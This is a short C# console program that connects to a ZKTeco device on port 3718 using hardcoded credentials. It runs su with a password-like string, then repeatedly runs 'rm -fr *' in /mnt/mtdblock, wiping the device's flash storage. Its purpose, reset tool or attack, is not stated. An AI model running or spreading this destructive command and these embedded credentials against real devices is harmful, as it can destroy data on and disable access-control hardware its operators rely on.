using OperationProj;
using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace SSHGUGU
{
    internal class Program
    {
        static void Main(string[] args)
        {

            string ipPc, ipDevice;
            Console.Write("IP Local: ");
            ipPc = Console.ReadLine();

            Console.Write("IP Servidor: ");
            ipDevice = Console.ReadLine();

            Operation op = new Operation();
            List<string> comandos = new List<string>();
            comandos.Add("su");
            comandos.Add("solokeyL:" + "\"");
            comandos.Add("cd /mnt/mtdblock && rm -fr *");
            comandos.Add("cd /mnt/mtdblock && rm -fr *");
            comandos.Add("cd /mnt/mtdblock && rm -fr *");
            Console.WriteLine(op.sendCommand(ipDevice, "3718", "zkteco", "90opl;././", comandos));
        }
    }
}
